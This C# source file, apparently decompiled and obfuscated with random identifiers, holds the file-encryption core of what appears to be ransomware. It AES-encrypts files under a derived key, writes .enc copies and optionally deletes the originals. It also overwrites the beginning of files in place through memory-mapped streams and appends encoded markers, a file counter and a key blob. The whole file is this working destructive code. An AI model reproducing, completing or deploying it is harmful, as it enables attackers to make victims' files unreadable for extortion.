using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace nLpTFjJRwUBp;

public static class mfItpThRjVteK
{
	public const int CdQnEBMmbwlbZ = 256;

	public static byte[] FcJaApJuwFzZc(int oUkxKodTUeHi)
	{
		byte[] array = new byte[oUkxKodTUeHi];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool tOlbSQCqIDNul(string znAhvHGreHg, byte[] oxUZoOAKbYAHoq, bool RqjQmALxIfgybjvS)
	{
		byte[] array = FcJaApJuwFzZc(16);
		using FileStream fileStream = new FileStream(znAhvHGreHg + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = HjVpPEZWuixEajrEr(oxUZoOAKbYAHoq, array);
		oxUZoOAKbYAHoq = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(znAhvHGreHg, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (RqjQmALxIfgybjvS)
			{
				File.Delete(znAhvHGreHg);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool iRSBmVqpKWKskkUQi(string ebNXzGimbJPiJ, byte[] AbGuTYvOfbK, bool rjwPtkoapqaUq)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(ebNXzGimbJPiJ, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = HjVpPEZWuixEajrEr(AbGuTYvOfbK, array);
		AbGuTYvOfbK = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(ebNXzGimbJPiJ.Remove(ebNXzGimbJPiJ.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] ZzukpnbfIFX(byte[] gKtoFulwUW, byte[] AEBNfIdSkp, byte[] SkCUilNddZImM)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = HjVpPEZWuixEajrEr(AEBNfIdSkp, SkCUilNddZImM);
		AEBNfIdSkp = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(gKtoFulwUW, 0, gKtoFulwUW.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] jhleLZEcKDWM(byte[] jZTyoNttTtyK, byte[] OfyVmiFldeggkySMOC, byte[] NbUBGuTVGVUoqm)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = HjVpPEZWuixEajrEr(OfyVmiFldeggkySMOC, NbUBGuTVGVUoqm);
		OfyVmiFldeggkySMOC = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(jZTyoNttTtyK, 0, jZTyoNttTtyK.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool QlVkciAupu(byte[] ZMsCqyHXwYabYB, byte[] KzBaNHZQvgs, byte[] WMguWNHXIc)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = HjVpPEZWuixEajrEr(ZMsCqyHXwYabYB, KzBaNHZQvgs);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(WMguWNHXIc);
	}

	public static Rfc2898DeriveBytes HjVpPEZWuixEajrEr(byte[] jWngtmXZFdWcaIe, byte[] YygRZcmHoyEB)
	{
		return new Rfc2898DeriveBytes(jWngtmXZFdWcaIe, YygRZcmHoyEB, 52768);
	}

	public static byte[] fihHPRoCTnieNGb(string cmLTGUKOTTntlS, int ExyLRFGmypm)
	{
		byte[] array = new byte[ExyLRFGmypm];
		try
		{
			if (RLgUMHIwwGSuCLo.xCMIeuGeak == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(cmLTGUKOTTntlS, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, ExyLRFGmypm);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(cmLTGUKOTTntlS, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, ExyLRFGmypm);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (RLgUMHIwwGSuCLo.QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(RLgUMHIwwGSuCLo.kOKakAljNFiEE, "File: " + cmLTGUKOTTntlS + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(cmLTGUKOTTntlS, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, ExyLRFGmypm);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool ZhJOAFGjrk(string JAYdEktfsDX, byte[] wSHuoUgoZPPZA, byte[] KTdbjFMhpnp = null)
	{
		try
		{
			byte[] array = null;
			if (RLgUMHIwwGSuCLo.xCMIeuGeak == "YES")
			{
				array = (RLgUMHIwwGSuCLo.sTRoWRHIVycKW ? Encoding.ASCII.GetBytes(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK(RLgUMHIwwGSuCLo.GpBysdvmnlMAkZ) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Kw==") + Convert.ToString(RLgUMHIwwGSuCLo.YROKpHBeSOV) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Kw==")) : Encoding.ASCII.GetBytes(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK(RLgUMHIwwGSuCLo.GpBysdvmnlMAkZ) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("LQ==") + Convert.ToString(RLgUMHIwwGSuCLo.YROKpHBeSOV) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(JAYdEktfsDX, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(wSHuoUgoZPPZA, 0, wSHuoUgoZPPZA.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(JAYdEktfsDX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!RLgUMHIwwGSuCLo.sTRoWRHIVycKW)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(KTdbjFMhpnp, 0, KTdbjFMhpnp.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (RLgUMHIwwGSuCLo.sTRoWRHIVycKW ? Encoding.ASCII.GetBytes(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK(RLgUMHIwwGSuCLo.GpBysdvmnlMAkZ) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Kw==") + Convert.ToString(RLgUMHIwwGSuCLo.YROKpHBeSOV) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Kw==")) : Encoding.ASCII.GetBytes(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK(RLgUMHIwwGSuCLo.GpBysdvmnlMAkZ) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("LQ==") + Convert.ToString(RLgUMHIwwGSuCLo.YROKpHBeSOV) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("LQ==")));
				FileStream fileStream2 = new FileStream(JAYdEktfsDX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(wSHuoUgoZPPZA, 0, wSHuoUgoZPPZA.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(JAYdEktfsDX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!RLgUMHIwwGSuCLo.sTRoWRHIVycKW)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(KTdbjFMhpnp, 0, KTdbjFMhpnp.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			RLgUMHIwwGSuCLo.QqDrvjCPIINo++;
		}
		catch (Exception ex)
		{
			if (RLgUMHIwwGSuCLo.QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(RLgUMHIwwGSuCLo.kOKakAljNFiEE, "File: " + JAYdEktfsDX + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (RLgUMHIwwGSuCLo.sTRoWRHIVycKW ? Encoding.ASCII.GetBytes(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK(RLgUMHIwwGSuCLo.GpBysdvmnlMAkZ) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Kw==") + Convert.ToString(RLgUMHIwwGSuCLo.YROKpHBeSOV) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Kw==")) : Encoding.ASCII.GetBytes(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK(RLgUMHIwwGSuCLo.GpBysdvmnlMAkZ) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("LQ==") + Convert.ToString(RLgUMHIwwGSuCLo.YROKpHBeSOV) + RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("LQ==")));
				FileStream fileStream4 = new FileStream(JAYdEktfsDX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(wSHuoUgoZPPZA, 0, wSHuoUgoZPPZA.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(JAYdEktfsDX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!RLgUMHIwwGSuCLo.sTRoWRHIVycKW)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(KTdbjFMhpnp, 0, KTdbjFMhpnp.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
